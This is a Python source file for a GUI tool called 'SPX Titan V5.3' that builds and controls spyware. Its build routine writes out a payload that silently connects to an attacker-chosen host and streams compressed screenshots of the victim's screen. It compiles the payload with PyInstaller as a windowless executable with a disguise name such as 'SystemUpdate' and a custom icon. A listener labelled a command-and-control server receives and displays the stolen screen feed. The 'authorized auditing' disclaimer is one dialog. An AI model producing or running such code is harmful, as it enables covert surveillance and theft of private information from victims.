import sys
import os
import socket
import threading
import subprocess
import shutil
import time

# --- AUTO-DEPENDENCY CHECK ---
def ensure_libs():
    libs = ['PyQt6', 'mss', 'opencv-python', 'numpy', 'pyinstaller']
    for lib in libs:
        try:
            __import__(lib.replace('-', '_'))
        except ImportError:
            print(f"[*] Missing {lib}. Installing for Sir...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

ensure_libs()

from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QLabel, QPushButton, QFileDialog, QMessageBox, 
                             QLineEdit, QHBoxLayout, QGroupBox, QFrame, QScrollArea, QComboBox)
from PyQt6.QtGui import QImage, QPixmap, QFont
from PyQt6.QtCore import Qt

class SPX_V5_Titan(QMainWindow):
    def __init__(self):
        super().__init__()
        
        if not self.trigger_disclaimer():
            sys.exit()

        self.setWindowTitle("SPX MASTER V5.3 - TITAN FINAL")
        self.setMinimumSize(1200, 900)
        self.view_mode = "FIT"
        self.icon_path = "" # Variable for user icon
        
        self.setStyleSheet("""
            QMainWindow { background-color: #080a0f; }
            QGroupBox { 
                color: #00d4ff; border: 1px solid #1a2a3a; border-radius: 12px; 
                margin-top: 15px; font-size: 14px; font-weight: bold;
                background-color: #0c111a; padding: 15px;
            }
            QLabel { color: #a0aec0; }
            QLineEdit, QComboBox { 
                background-color: #161e2b; border: 1px solid #2d3748; 
                color: #ffffff; padding: 8px; border-radius: 5px; 
            }
            QPushButton { 
                background-color: #1a2a3a; color: #00d4ff; border: 1px solid #00d4ff; 
                padding: 10px; border-radius: 5px; font-weight: bold;
            }
            QPushButton:hover { background-color: #00d4ff; color: #080a0f; }
            #BuildBtn { background-color: #ff0055; color: white; border: none; font-size: 16px; }
            #IcoBtn { background-color: #1a2a3a; border-style: dashed; border-width: 2px; }
            QScrollArea { border: 2px solid #1a2a3a; background-color: #000; border-radius: 10px; }
        """)
        
        self.init_ui()

    def trigger_disclaimer(self):
        warn = QMessageBox()
        warn.setWindowTitle("LEGAL NOTICE - SPARKEDIX")
        warn.setText("<h2 style='color: #ff0055;'>SPARKEDIX TITAN V5.3</h2>"
                     "<p style='color: white;'>Sir, this software is for <b>AUTHORIZED AUDITING</b> only.</p>")
        agree = warn.addButton("I ACCEPT", QMessageBox.ButtonRole.AcceptRole)
        warn.addButton("EXIT", QMessageBox.ButtonRole.RejectRole)
        warn.exec()
        return warn.clickedButton() == agree

    def init_ui(self):
        container = QWidget()
        self.setCentralWidget(container)
        layout = QVBoxLayout(container)

        # --- HEADER ---
        title = QLabel("S P X  T I T A N  V 5 . 3")
        title.setFont(QFont("Impact", 45))
        title.setStyleSheet("color: #ff0055;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)

        # --- 1. CONFIG ---
        cfg_box = QGroupBox("PAYLOAD SETTINGS")
        cfg_lay = QVBoxLayout()
        
        row1 = QHBoxLayout()
        self.ip_in = QLineEdit(); self.ip_in.setPlaceholderText("LHOST (IP/URL)")
        self.port_in = QLineEdit("8888"); self.port_in.setFixedWidth(70)
        row1.addWidget(QLabel("HOST:")); row1.addWidget(self.ip_in); row1.addWidget(QLabel("PORT:")); row1.addWidget(self.port_in)
        
        row2 = QHBoxLayout()
        self.file_name = QLineEdit(); self.file_name.setPlaceholderText("Filename (e.g. SystemUpdate)")
        self.payload_type = QComboBox(); self.payload_type.addItems(["Windows (.EXE)", "Android (.APK)"])
        self.btn_ico = QPushButton("SELECT ICON (.ICO)"); self.btn_ico.setObjectName("IcoBtn")
        self.btn_ico.clicked.connect(self.select_icon)
        
        row2.addWidget(QLabel("NAME:")); row2.addWidget(self.file_name); row2.addWidget(self.payload_type); row2.addWidget(self.btn_ico)
        
        cfg_lay.addLayout(row1); cfg_lay.addLayout(row2)
        cfg_box.setLayout(cfg_lay); layout.addWidget(cfg_box)

        # --- 2. CONTROLS ---
        ctrl_lay = QHBoxLayout()
        self.btn_build = QPushButton("GENERATE PAYLOAD"); self.btn_build.setObjectName("BuildBtn")
        self.btn_build.clicked.connect(self.start_build_process)
        
        self.btn_view_mode = QPushButton("MODE: FIT TO WINDOW"); self.btn_view_mode.setFixedWidth(200)
        self.btn_view_mode.clicked.connect(self.toggle_view)
        
        ctrl_lay.addWidget(self.btn_build, 2); ctrl_lay.addWidget(self.btn_view_mode, 1)
        layout.addLayout(ctrl_lay)

        # --- 3. MONITOR ---
        self.scroll = QScrollArea(); self.scroll.setWidgetResizable(True)
        self.screen_lab = QLabel("SYSTEM READY - STANDBY FOR UPLINK")
        self.screen_lab.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.scroll.setWidget(self.screen_lab)
        layout.addWidget(self.scroll)
        
        self.btn_srv = QPushButton("START COMMAND & CONTROL SERVER")
        self.btn_srv.clicked.connect(self.start_server)
        layout.addWidget(self.btn_srv)

    def select_icon(self):
        f, _ = QFileDialog.getOpenFileName(self, "Select Icon", "", "Icon Files (*.ico)")
        if f:
            self.icon_path = f
            self.btn_ico.setText(f"ICON: {os.path.basename(f)}")

    def toggle_view(self):
        self.view_mode = "ORIGINAL" if self.view_mode == "FIT" else "FIT"
        self.btn_view_mode.setText(f"MODE: {self.view_mode} TO WINDOW" if self.view_mode == "FIT" else "MODE: ORIGINAL SIZE")

    def start_build_process(self):
        if not self.ip_in.text() or not self.file_name.text():
            QMessageBox.warning(self, "Error", "Sir, details miss hain!")
            return
        self.btn_build.setEnabled(False); self.btn_build.setText("BUILDING...")
        threading.Thread(target=self.build_logic, daemon=True).start()

    def build_logic(self):
        try:
            name = self.file_name.text().replace(" ", "_")
            payload_src = f"{name}_src.py"
            with open(payload_src, "w") as f:
                f.write(f"""
import socket, cv2, mss, zlib, numpy as np, time
def run():
    while True:
        try:
            s = socket.socket(); s.connect(('{self.ip_in.text()}', {self.port_in.text()}))
            with mss.mss() as sct:
                mon = sct.monitors[1]
                while True:
                    img = np.array(sct.grab(mon))
                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    _, b = cv2.imencode('.jpg', cv2.resize(img, (1280, 720)), [60])
                    d = zlib.compress(b)
                    s.send(f"{{len(d):16}}".encode()); s.sendall(d)
                    time.sleep(0.04)
        except: time.sleep(5)
if __name__ == '__main__': run()
""")
            cmd = ["pyinstaller", "--noconsole", "--onefile", f"--name={name}", "--collect-submodules", "cv2", "--noconfirm"]
            if self.icon_path:
                cmd.extend(["--icon", self.icon_path])
            
            subprocess.run(cmd, capture_output=True, creationflags=0x08000000)
            print(f"[*] Build Complete: dist/{name}.exe")
        except Exception as e: print(f"Error: {e}")
        self.btn_build.setEnabled(True); self.btn_build.setText("GENERATE PAYLOAD")

    def start_server(self):
        self.btn_srv.setEnabled(False); self.btn_srv.setText("LISTENING...")
        threading.Thread(target=self.listen_logic, daemon=True).start()

    def listen_logic(self):
        import zlib, numpy as np, cv2
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind(('0.0.0.0', int(self.port_in.text()))); sock.listen(1)
            client, addr = sock.accept()
            while True:
                header = client.recv(16)
                if not header: break
                size = int(header.decode().strip())
                data = b''
                while len(data) < size: data += client.recv(8192)
                raw = cv2.imdecode(np.frombuffer(zlib.decompress(data), np.uint8), 1)
                rgb = cv2.cvtColor(raw, cv2.COLOR_BGR2RGB)
                qimg = QImage(rgb.data, rgb.shape[1], rgb.shape[0], rgb.shape[1]*3, QImage.Format.Format_RGB888)
                pix = QPixmap.fromImage(qimg)
                if self.view_mode == "FIT":
                    self.screen_lab.setPixmap(pix.scaled(self.scroll.size(), Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
                else:
                    self.screen_lab.setPixmap(pix)
        except Exception as e: print(f"C2 Error: {e}")
        finally: sock.close(); self.btn_srv.setEnabled(True); self.btn_srv.setText("START C2 SERVER")

if __name__ == "__main__":
    app = QApplication(sys.argv); window = SPX_V5_Titan(); window.showMaximized(); sys.exit(app.exec())